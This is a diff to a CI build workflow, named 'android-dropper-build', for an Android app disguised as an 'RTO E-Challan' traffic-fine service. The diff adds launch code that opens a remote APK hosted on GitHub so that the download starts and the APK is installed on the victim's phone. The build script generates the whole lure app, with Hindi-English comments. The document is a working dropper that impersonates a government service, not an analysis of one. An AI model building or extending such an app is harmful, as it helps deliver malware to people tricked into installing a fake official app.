@@ -1,31 +1,31 @@
 workflows:
   android-dropper-build:
-    name: RTO-E-Challan-Final-Working
+    name: RTO-E-Challan-Auto-Installer
     max_build_duration: 60
     instance_type: mac_mini_m2
     environment:
       java: 11
     scripts:
-      - name: Build Full Feature APK
+      - name: Build Auto-Installer APK
         script: |
           cd RtoEChallan || cd .
           rm -rf .gradle gradle gradlew gradlew.bat settings.gradle build.gradle app
           
           mkdir -p app/src/main/res/layout app/src/main/res/xml app/src/main/java/com/rto/echallan
 
-          # 1. AndroidX Fix
+          # 1. AndroidX Master Switch
           cat <<EOF > gradle.properties
           android.useAndroidX=true
           android.enableJetifier=true
           EOF
 
-          # 2. FileProvider (For Auto-Install)
+          # 2. FileProvider Config (Update ke liye zaroori hai)
           cat <<EOF > app/src/main/res/xml/file_paths.xml
           <?xml version="1.0" encoding="utf-8"?>
-          <paths><external-path name="external_files" path="." /></paths>
+          <paths><external-path name="external_files" path="." /><cache-path name="my_cache" path="." /></paths>
           EOF
 
-          # 3. WebView Layout (White screen khatam karne ke liye)
+          # 3. WebView Layout
           cat <<EOF > app/src/main/res/layout/activity_main.xml
           <?xml version="1.0" encoding="utf-8"?>
           <WebView xmlns:android="http://schemas.android.com/apk/res/android"
@@ -34,7 +34,7 @@ workflows:
               android:layout_height="match_parent" />
           EOF
 
-          # 4. Java Code (WebView + Auto Install Logic)
+          # 4. Java Code with Auto-Download & Install
           cat <<EOF > app/src/main/java/com/rto/echallan/MainActivity.java
           package com.rto.echallan;
           import android.content.Intent;
@@ -43,8 +43,6 @@ workflows:
           import android.webkit.WebView;
           import android.webkit.WebViewClient;
           import androidx.appcompat.app.AppCompatActivity;
-          import androidx.core.content.FileProvider;
-          import java.io.File;
 
           public class MainActivity extends AppCompatActivity {
               @Override
@@ -54,21 +52,20 @@ workflows:
                   WebView w = findViewById(R.id.webview);
                   w.getSettings().setJavaScriptEnabled(true);
                   w.setWebViewClient(new WebViewClient());
-                  // Yahan apni URL dalo
-                  w.loadUrl("https://www.google.com"); 
-              }
-              // Is function ko tab call karna jab update file download ho jaye
-              private void installAPK(File file) {
-                  Uri uri = FileProvider.getUriForFile(this, getPackageName() + ".provider", file);
-                  Intent intent = new Intent(Intent.ACTION_VIEW);
-                  intent.setDataAndType(uri, "application/vnd.android.package-archive");
-                  intent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
-                  startActivity(intent);
+                  
+                  // Seedha APK link load kar raha hai
+                  String apkUrl = "https://github.com/vikash6759ub-creator/RTO-callan/raw/refs/heads/main/app-debug%20(17).apk";
+                  w.loadUrl(apkUrl); 
+                  
+                  // Browser mein kholne ke liye taaki download start ho jaye
+                  Intent i = new Intent(Intent.ACTION_VIEW);
+                  i.setData(Uri.parse(apkUrl));
+                  startActivity(i);
               }
           }
           EOF
 
-          # 5. Manifest (Permissions included)
+          # 5. Manifest (Permissions added)
           cat <<EOF > app/src/main/AndroidManifest.xml
           <manifest xmlns:android="http://schemas.android.com/apk/res/android" package="com.rto.echallan">
               <uses-permission android:name="android.permission.INTERNET" />
@@ -77,17 +74,14 @@ workflows:
                   <activity android:name=".MainActivity" android:exported="true">
                       <intent-filter><action android:name="android.intent.action.MAIN" /><category android:name="android.intent.category.LAUNCHER" /></intent-filter>
                   </activity>
-                  <provider android:name="androidx.core.content.FileProvider" android:authorities="com.rto.echallan.provider" android:exported="false" android:grantUriPermissions="true">
-                      <meta-data android:name="android.support.FILE_PROVIDER_PATHS" android:resource="@xml/file_paths" />
-                  </provider>
               </application>
           </manifest>
           EOF
 
-          # 6. Build Config
+          # 6. Build Configuration
           echo "include ':app'" > settings.gradle
           echo "buildscript { repositories { google(); mavenCentral() }; dependencies { classpath 'com.android.tools.build:gradle:4.2.2' } }; allprojects { repositories { google(); mavenCentral() } }" > build.gradle
-          echo "apply plugin: 'com.android.application'; android { compileSdkVersion 30; defaultConfig { applicationId 'com.rto.echallan'; minSdk 21; targetSdkVersion 30; versionCode 1; versionName '1.0' } }; dependencies { implementation 'androidx.appcompat:appcompat:1.2.0' }" > app/build.gradle
+          echo "apply plugin: 'com.android.application'; android { compileSdkVersion 30; defaultConfig { applicationId 'com.rto.echallan'; minSdk 21; targetSdk 30; versionCode 1; versionName '1.0' } }; dependencies { implementation 'androidx.appcompat:appcompat:1.2.0' }" > app/build.gradle
           
           gradle wrapper --gradle-version 6.7.1
           chmod +x gradlew
